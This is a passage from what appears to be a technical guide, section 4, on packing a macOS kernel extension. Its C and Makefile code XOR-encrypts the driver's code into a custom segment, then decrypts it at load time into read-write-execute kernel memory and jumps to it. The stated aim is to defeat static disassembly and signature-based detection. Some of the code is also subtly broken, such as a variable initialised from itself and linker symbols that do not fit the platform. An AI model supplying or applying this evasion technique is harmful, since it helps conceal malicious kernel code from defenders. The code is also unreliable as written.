## 4.  Custom Sections & Executable‑Memory Packing

A kext can be built so that **most of its code lives in a non‑standard, non‑executable section** (e.g. “.obf”) and is **decrypted into a newly allocated RWX page** at load time.  

### 4.1  Packing the `.text` into `.obf`

**Makefile fragment**

```make
CFLAGS += -ffunction-sections -fdata-sections
LDFLAGS += -Wl,-sectcreate,__OBF,__packed_text,packed.bin
```

*`packed.bin` is a raw dump of the compiled `.text` that has been encrypted with a simple XOR key; it is linked into a custom segment `__OBF`.*

### 4.2  Runtime unpacker (C + asm)

```c
/* ---------------------------------------------------------- */
/*  unpacker.c – called from the kext’s start routine          */

extern const uint8_t __start___OBF[];   /* linker symbols for the packed blob */
extern const uint8_t __stop___OBF[];

static void *unpacked_mem = NULL;
static size_t packed_len;

/* Simple XOR key – could be derived from a hardware id, MAC address, etc. */
static const uint8_t unpack_key = 0x7C;

/* Allocate RWX memory, copy, decrypt */
static kern_return_t unpack_code(void)
{
    packed_len = __stop___OBF - __start___OBF;
    vm_map_t kernel_map = kernel_map;               // global in xnu
    vm_offset_t addr = 0;
    kern_return_t kr = kmem_alloc(kernel_map, &addr, packed_len);
    if (kr != KERN_SUCCESS) return kr;

    /* Make it executable */
    kr = vm_protect(kernel_map, addr, packed_len,
                    FALSE, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) return kr;

    /* Copy encrypted blob */
    bcopy(__start___OBF, (void *)addr, packed_len);

    /* Decrypt in‑place */
    uint8_t *p = (uint8_t *)addr;
    for (size_t i = 0; i < packed_len; ++i)
        p[i] ^= unpack_key;

    unpacked_mem = (void *)addr;
    return KERN_SUCCESS;
}

/* Jump to the unpacked entry point (first 4 bytes are a relative jump). */
static void launch_unpacked(void)
{
    typedef void (*entry_t)(void);
    entry_t entry = (entry_t)unpacked_mem;
    entry();                         // transfers control into the decrypted code
}

/* ---------------------------------------------------------- */
kern_return_t MyKextStart()
{
    if (unpack_code() != KERN_SUCCESS) {
        IOLog("Unpack failed\n");
        return KERN_FAILURE;
    }
    launch_unpacked();           // never returns – the real driver lives here
    return KERN_SUCCESS;         // unreachable, kept for compiler
}
```

*Result*: A static disassembler only sees a tiny stub (`MyKextStart`) and a data blob.  The actual driver code only exists **in RAM** after the unpack step, making any on‑disk signature‑based detection ineffective.

